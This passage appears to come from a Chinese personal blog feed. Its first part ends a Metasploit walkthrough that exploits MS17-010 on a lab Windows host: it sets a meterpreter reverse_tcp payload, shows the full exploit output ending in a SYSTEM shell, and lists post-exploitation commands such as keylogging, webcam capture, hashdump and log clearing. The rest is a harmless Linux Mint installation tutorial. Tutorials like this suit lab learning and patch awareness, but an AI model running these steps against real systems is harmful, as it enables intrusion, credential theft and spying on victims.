</span></span><span class="line"><span class="cl">  seen in the EternalRomance, EternalChampion, and EternalSynergy 
</span></span><span class="line"><span class="cl">  exploits. This exploit chain is more reliable than the EternalBlue 
</span></span><span class="line"><span class="cl">  exploit, but requires a named pipe.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">References:
</span></span><span class="line"><span class="cl">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0143/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0146/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0147/
</span></span><span class="line"><span class="cl">  https://github.com/worawit/MS17-010
</span></span><span class="line"><span class="cl">  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
</span></span><span class="line"><span class="cl">  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Also known as:
</span></span><span class="line"><span class="cl">  ETERNALSYNERGY
</span></span><span class="line"><span class="cl">  ETERNALROMANCE
</span></span><span class="line"><span class="cl">  ETERNALCHAMPION
</span></span><span class="line"><span class="cl">  ETERNALBLUE
</span></span></code></pre></td></tr></table>
</div>
</div><p>看到这么一大堆，你也不用紧张，其实跟上面的一样，你只需要设置四个东西</p>
<ul>
<li>RHOST，目标IP，目标的DHCP地址</li>
<li>LHOST，监听IP，一般是你自己的DHCP地址</li>
<li>LPORT，监听端口，随便写一个，只要没冲突就行。比如我是Arch Linux，默认全端口关闭，我可以随便写。</li>
<li>payload，攻击载荷，一般是 windows/meterpreter/reverse_tcp ，你也可以用别的，想看看还有什么能用就执行 show payloads 吧。</li>
</ul>
<p>接下来就设置这四个东西吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 192.168.42.141
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">6666</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> RHOST 192.168.42.252
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> payloads windows/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table>
</div>
</div><p>设置完以后执行 <strong><code>run</code></strong> 或者 <strong><code>exploit</code></strong> ，其实二者并没有什么区别，都是一样的。</p>
<p>喜欢哪个就用哪个吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>好啦，如果没有问题，然后返回一下内容，那么就说明攻击成功了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 192.168.42.141:6666 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Target OS: Windows 5.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Filling barrel with fish... <span class="k">done</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - &lt;---------------- <span class="p">|</span> Entering Danger Zone <span class="p">|</span> ----------------&gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - 	<span class="o">[</span>*<span class="o">]</span> Preparing dynamite...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - 		<span class="o">[</span>*<span class="o">]</span> Trying stick <span class="m">1</span> <span class="o">(</span>x86<span class="o">)</span>...Boom!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - 	<span class="o">[</span>+<span class="o">]</span> Successfully Leaked Transaction!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - 	<span class="o">[</span>+<span class="o">]</span> Successfully caught Fish-in-a-barrel
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - &lt;---------------- <span class="p">|</span> Leaving Danger Zone <span class="p">|</span> ----------------&gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Reading from CONNECTION struct at: 0x81382010
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Built a write-what-where primitive...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 192.168.42.252:445 - Overwrite complete... SYSTEM session obtained!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Selecting native target
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Uploading payload... JmgBrDpV.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Created <span class="se">\J</span>mgBrDpV.exe...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 192.168.42.252:445 - Service started successfully...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Deleting <span class="se">\J</span>mgBrDpV.exe...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">179779</span> bytes<span class="o">)</span> to 192.168.42.252
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.42.141:6666 -&gt; 192.168.42.252:1027<span class="o">)</span> at 2019-07-26 23:11:38 +0800
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>截一张图吧

接下来就可以进行你想干的事情了，而现在干的事情叫做后渗透。后渗透相当复杂，这里就不多讲了。</p>
<p>那么至少可以干点什么呢，执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; <span class="nb">help</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>就可以看到帮助文档了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Core Commands
</span></span><span class="line"><span class="cl">=============
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command                   Description
</span></span><span class="line"><span class="cl">    -------                   -----------
</span></span><span class="line"><span class="cl">    ?                         Help menu
</span></span><span class="line"><span class="cl">    background                Backgrounds the current session
</span></span><span class="line"><span class="cl">    bg                        Alias for background
</span></span><span class="line"><span class="cl">    bgkill                    Kills a background meterpreter script
</span></span><span class="line"><span class="cl">    bglist                    Lists running background scripts
</span></span><span class="line"><span class="cl">    bgrun                     Executes a meterpreter script as a background thread
</span></span><span class="line"><span class="cl">    channel                   Displays information or control active channels
</span></span><span class="line"><span class="cl">    close                     Closes a channel
</span></span><span class="line"><span class="cl">    disable_unicode_encoding  Disables encoding of unicode strings
</span></span><span class="line"><span class="cl">    enable_unicode_encoding   Enables encoding of unicode strings
</span></span><span class="line"><span class="cl">    exit                      Terminate the meterpreter session
</span></span><span class="line"><span class="cl">    get_timeouts              Get the current session timeout values
</span></span><span class="line"><span class="cl">    guid                      Get the session GUID
</span></span><span class="line"><span class="cl">    help                      Help menu
</span></span><span class="line"><span class="cl">    info                      Displays information about a Post module
</span></span><span class="line"><span class="cl">    irb                       Open an interactive Ruby shell on the current session
</span></span><span class="line"><span class="cl">    load                      Load one or more meterpreter extensions
</span></span><span class="line"><span class="cl">    machine_id                Get the MSF ID of the machine attached to the session
</span></span><span class="line"><span class="cl">    migrate                   Migrate the server to another process
</span></span><span class="line"><span class="cl">    pivot                     Manage pivot listeners
</span></span><span class="line"><span class="cl">    pry                       Open the Pry debugger on the current session
</span></span><span class="line"><span class="cl">    quit                      Terminate the meterpreter session
</span></span><span class="line"><span class="cl">    read                      Reads data from a channel
</span></span><span class="line"><span class="cl">    resource                  Run the commands stored in a file
</span></span><span class="line"><span class="cl">    run                       Executes a meterpreter script or Post module
</span></span><span class="line"><span class="cl">    sessions                  Quickly switch to another session
</span></span><span class="line"><span class="cl">    set_timeouts              Set the current session timeout values
</span></span><span class="line"><span class="cl">    sleep                     Force Meterpreter to go quiet, then re-establish session.
</span></span><span class="line"><span class="cl">    transport                 Change the current transport mechanism
</span></span><span class="line"><span class="cl">    use                       Deprecated alias for &#34;load&#34;
</span></span><span class="line"><span class="cl">    uuid                      Get the UUID for the current session
</span></span><span class="line"><span class="cl">    write                     Writes data to a channel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: File system Commands
</span></span><span class="line"><span class="cl">============================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    cat           Read the contents of a file to the screen
</span></span><span class="line"><span class="cl">    cd            Change directory
</span></span><span class="line"><span class="cl">    checksum      Retrieve the checksum of a file
</span></span><span class="line"><span class="cl">    cp            Copy source to destination
</span></span><span class="line"><span class="cl">    dir           List files (alias for ls)
</span></span><span class="line"><span class="cl">    download      Download a file or directory
</span></span><span class="line"><span class="cl">    edit          Edit a file
</span></span><span class="line"><span class="cl">    getlwd        Print local working directory
</span></span><span class="line"><span class="cl">    getwd         Print working directory
</span></span><span class="line"><span class="cl">    lcd           Change local working directory
</span></span><span class="line"><span class="cl">    lls           List local files
</span></span><span class="line"><span class="cl">    lpwd          Print local working directory
</span></span><span class="line"><span class="cl">    ls            List files
</span></span><span class="line"><span class="cl">    mkdir         Make directory
</span></span><span class="line"><span class="cl">    mv            Move source to destination
</span></span><span class="line"><span class="cl">    pwd           Print working directory
</span></span><span class="line"><span class="cl">    rm            Delete the specified file
</span></span><span class="line"><span class="cl">    rmdir         Remove directory
</span></span><span class="line"><span class="cl">    search        Search for files
</span></span><span class="line"><span class="cl">    show_mount    List all mount points/logical drives
</span></span><span class="line"><span class="cl">    upload        Upload a file or directory
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: Networking Commands
</span></span><span class="line"><span class="cl">===========================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    arp           Display the host ARP cache
</span></span><span class="line"><span class="cl">    getproxy      Display the current proxy configuration
</span></span><span class="line"><span class="cl">    ifconfig      Display interfaces
</span></span><span class="line"><span class="cl">    ipconfig      Display interfaces
</span></span><span class="line"><span class="cl">    netstat       Display the network connections
</span></span><span class="line"><span class="cl">    portfwd       Forward a local port to a remote service
</span></span><span class="line"><span class="cl">    resolve       Resolve a set of host names on the target
</span></span><span class="line"><span class="cl">    route         View and modify the routing table
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: System Commands
</span></span><span class="line"><span class="cl">=======================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    clearev       Clear the event log
</span></span><span class="line"><span class="cl">    drop_token    Relinquishes any active impersonation token.
</span></span><span class="line"><span class="cl">    execute       Execute a command
</span></span><span class="line"><span class="cl">    getenv        Get one or more environment variable values
</span></span><span class="line"><span class="cl">    getpid        Get the current process identifier
</span></span><span class="line"><span class="cl">    getprivs      Attempt to enable all privileges available to the current process
</span></span><span class="line"><span class="cl">    getsid        Get the SID of the user that the server is running as
</span></span><span class="line"><span class="cl">    getuid        Get the user that the server is running as
</span></span><span class="line"><span class="cl">    kill          Terminate a process
</span></span><span class="line"><span class="cl">    localtime     Displays the target system&#39;s local date and time
</span></span><span class="line"><span class="cl">    pgrep         Filter processes by name
</span></span><span class="line"><span class="cl">    pkill         Terminate processes by name
</span></span><span class="line"><span class="cl">    ps            List running processes
</span></span><span class="line"><span class="cl">    reboot        Reboots the remote computer
</span></span><span class="line"><span class="cl">    reg           Modify and interact with the remote registry
</span></span><span class="line"><span class="cl">    rev2self      Calls RevertToSelf() on the remote machine
</span></span><span class="line"><span class="cl">    shell         Drop into a system command shell
</span></span><span class="line"><span class="cl">    shutdown      Shuts down the remote computer
</span></span><span class="line"><span class="cl">    steal_token   Attempts to steal an impersonation token from the target process
</span></span><span class="line"><span class="cl">    suspend       Suspends or resumes a list of processes
</span></span><span class="line"><span class="cl">    sysinfo       Gets information about the remote system, such as OS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: User interface Commands
</span></span><span class="line"><span class="cl">===============================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command        Description
</span></span><span class="line"><span class="cl">    -------        -----------
</span></span><span class="line"><span class="cl">    enumdesktops   List all accessible desktops and window stations
</span></span><span class="line"><span class="cl">    getdesktop     Get the current meterpreter desktop
</span></span><span class="line"><span class="cl">    idletime       Returns the number of seconds the remote user has been idle
</span></span><span class="line"><span class="cl">    keyboard_send  Send keystrokes
</span></span><span class="line"><span class="cl">    keyscan_dump   Dump the keystroke buffer
</span></span><span class="line"><span class="cl">    keyscan_start  Start capturing keystrokes
</span></span><span class="line"><span class="cl">    keyscan_stop   Stop capturing keystrokes
</span></span><span class="line"><span class="cl">    mouse          Send mouse events
</span></span><span class="line"><span class="cl">    screenshot     Grab a screenshot of the interactive desktop
</span></span><span class="line"><span class="cl">    setdesktop     Change the meterpreters current desktop
</span></span><span class="line"><span class="cl">    uictl          Control some of the user interface components
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: Webcam Commands
</span></span><span class="line"><span class="cl">=======================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command        Description
</span></span><span class="line"><span class="cl">    -------        -----------
</span></span><span class="line"><span class="cl">    record_mic     Record audio from the default microphone for X seconds
</span></span><span class="line"><span class="cl">    webcam_chat    Start a video chat
</span></span><span class="line"><span class="cl">    webcam_list    List webcams
</span></span><span class="line"><span class="cl">    webcam_snap    Take a snapshot from the specified webcam
</span></span><span class="line"><span class="cl">    webcam_stream  Play a video stream from the specified webcam
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: Audio Output Commands
</span></span><span class="line"><span class="cl">=============================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    play          play an audio file on target system, nothing written on disk
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Priv: Elevate Commands
</span></span><span class="line"><span class="cl">======================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    getsystem     Attempt to elevate your privilege to that of local system.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Priv: Password database Commands
</span></span><span class="line"><span class="cl">================================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    hashdump      Dumps the contents of the SAM database
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Priv: Timestomp Commands
</span></span><span class="line"><span class="cl">========================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    timestomp     Manipulate file MACE attributes
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛，返回来的很多是吧，这几个比较常用</p>
<p><strong><code>cd</code></strong>、<strong><code>ls</code></strong>、<strong><code>shell</code></strong>、<strong><code>cat</code></strong></p>
<p>懂Linux的人基本上都知道了，这里不多做解释了。</p>
<h2 id="小结">小结</h2>
<p>首先本篇博客仅作为测试用途，请勿将其用于违法用途。</p>
<p>其次，ms17-010这类的漏洞都是十分危险的，Windows用户一定要注意及时更新，打好补丁，不要给坏人可乘之机，最好是干脆直接日用Linux，windows仅用于娱乐即可。</p>
<p>然后这篇博客也带有很多水的成分，谢谢浏览。</p>
]]></description>
</item><item>
    <title>Linux Mint 安装教程</title>
    <link>http://weepingdogel.github.io/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</link>
    <pubDate>Sun, 23 Jun 2019 20:10:29 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/%e6%88%aa%e5%9b%be_2019-06-23_18-05-27.png" referrerpolicy="no-referrer">
            </div><h2 id="简介">简介</h2>
<p>Linux Mint是一款由Linux Mint Team团队从2006年开始发行，是基于Debian和Ubuntu的发行版。</p>
<p>其目的是提供一种更加完整的即刻可用体验，它诞生的目的是为家庭用户和企业提供一个免费的，易用的，舒适而优雅的桌面操作系统。</p>
<p>包括了浏览器 多媒体播放器 DVD播放支持 Java和其他组件，它有三个桌面环境版本，分别是Cinnamon，MATE，xfce。</p>
<h2 id="下载">下载</h2>
<p>Linux Mint可以去官网下载，官网有两种下载方式，一种是通过所在国家对应的镜像站进行HTTP下载，还有一种就是通过种子下载的。</p>
<p>由于官网上的上海大学开源镜像站进不去所以我只好选择了种子下载，但是本篇博客将会提供xfce版本的下载地址。</p>
<p>Linux Mint官网：<a href="https://www.linuxmint.com/" target="_blank" rel="noopener noreffer">https://www.linuxmint.com/</a></p>
<p>墙内用户可以从以下两个镜像源快速下载Linux Mint:</p>
<ul>
<li><a href="https://mirrors.tuna.tsinghua.edu.cn/linuxmint-cd/stable/" target="_blank" rel="noopener noreffer">清华开源镜像站</a></li>
<li><a href="http://mirrors.ustc.edu.cn/linuxmint-cd/stable/" target="_blank" rel="noopener noreffer">中科大开源镜像站</a></li>
</ul>
<p></p>
<p></p>
<h2 id="安装">安装</h2>
<p><strong>xfce版本安装条件：至少512MB或以上的内存，15GB或以上的磁盘空间</strong></p>
<p>你可以选择安装在<strong>物理机</strong>上，也可以安装在<strong>虚拟机</strong>上。</p>
<p>如果你需要安装在<strong>物理机</strong>则需要使用<strong>refus</strong>等类似的<strong>U盘启动制作工具</strong>制作<strong>启动盘</strong>。</p>
<p>本篇博客将使用虚拟机作为演示。</p>
<p></p>
<p></p>
<h3 id="安装过程">安装过程</h3>
<h4 id="挂载安装介质">挂载安装介质</h4>
<p>首先将下载好的<strong>镜像文件</strong>加入<strong>虚拟机</strong>的启动，如果是<strong>物理机</strong>则插入你<strong>制作好的启动盘</strong>。</p>
<p></p>
<p></p>
<p></p>
<p>选择好之后，点击<strong>确定</strong></p>
<p>然后启动虚拟机即可。而物理机则需要重启然后按相应的键，ESC F12 F11之类的，这些百度上都有，搜索“你电脑的品牌或者主板的品牌+U盘启动”就可以查到</p>
<p></p>
<p>然后虚拟机将会自动切换到虚拟CD进行启动，等待即可。</p>
<p>接下来就会出现这个画面，等待10秒后进入了CD Live即可。</p>
<p></p>
<p>10秒后，将会进入开机动画，不用多解释（还挺好看的哈）</p>
<p></p>
<p>再过了一会儿，就进入这个界面了，这就是我上文说的CD Live。</p>
<p></p>
<p>哈哈哈哈吐嘈一下这个时间显示，为什么是8点呢，而我发布这篇博客的时间是下午两点啊，其实是因为这个CD Live的默认时区不一样，不用理会他，我们继续操作即可。</p>
<h4 id="选择语言习惯和安装需要">选择语言，习惯和安装需要</h4>
<p>那么接下来点击这个 <strong>“Install Linux Mint”</strong> ，然后就会弹出这个安装界面了，第一页这里是选择语言，我们选择简体中文（当然你看得懂什么语言就选什么语言）。</p>
<p></p>
<p></p>
<p></p>
<p>然后就是选择键盘布局了，这里默认就好，或者选择美式，但都差不多是一样的。</p>
<p></p>
<p></p>
<p></p>
<h4 id="分区">分区</h4>
<p>然后就是一个<strong>重头戏</strong>了,你一定要<strong>认真看！认真看！认真看！</strong></p>
<p>（重要的事情说三遍）</p>
<p>这里会给你两个选项来进行分区，其中第一个单选框的意思是把你的<strong>整个硬盘全部格式化</strong>然后再安装Linux Mint，如果你是虚拟机的话选这个无所谓，但是如果你是<strong>物理机</strong>的话就要<strong>慎重</strong>了,无论安装成功或失败你的原有数据都会丢失。</p>
<p>下面两个勾不用理会，因为大部分人都不会选择第一个单选框，所以这两个勾毫无意义了。本篇博客也将选择 <strong>“其他选项”</strong> 。 那么我们选择下面那个 <strong>“其他选项”</strong> 。</p>
<p></p>
<p>选择其他选项后，就会进入这个页面，这里就是建立分区表的地方（废话，下面都写着呢，还用你说）了。</p>
<p></p>
<p>那么，因为教程演示是虚拟机，所以点击新建分区表，如果是物理机则不需要了。</p>
<p>这时候会弹出一个提示，这个也不必理会它，直接点<code>继续</code>即可。</p>
<p></p>
<p>接下来一个空的分区表就建立好了。</p>
<p></p>
<p>那么，要怎样分区呢？</p>
<p>我们知道Linux必须分的区有<code>根(/)分区</code>、<code>/boot分区</code>和<code>swap分区</code>，那么该分多少呢?</p>
<p>从<code>/boot</code>说起，这个分区是存放系统启动引导文件的，只需要500MB左右，但别小看了这个小分区，如果没有这个，根分区一旦被写满，系统将无法启动。</p>
<p><code>SWAP分区</code>：用于给内存交换空间，当内存要爆了的时候系统会把一部分进程转移到SWAP里面，它所需的大小可以是内存大小的一半，也可以与内存大小相等，也可以是内存的两倍，但是太大也不好，如果内存够用的话，swap分太大会浪费不少的硬盘存储空间。</p>
<p>最后是根分区了，这个好理解，就是系统分区，应该将剩下的全都分给它。</p>
<p>那么具体怎么分呢，参考我操作咯</p>
<p>点击那个<code>+</code>,将会弹出一个创建分区的窗口</p>
<p></p>
<p></p>
<p>先创建一个<code>/boot</code>分区，大小500MB，文件系统为EXT4文件系统，挂载点为<code>/boot</code>。</p>
<p></p>
<p>然后发现左下角的<code>+</code>，变成了灰色？不用怕，继续选择空闲空间它就会变成可选择的了。</p>
<p>那么同上操作，我们分SWAP，但是注意了：SWAP不是挂载点，应该在文件系统里选择 <strong>“交换空间”</strong></p>
<p>类型为主分区，大小1024MB，文件系统为交换空间，挂载点不用选择</p>
<p></p>
<p></p>
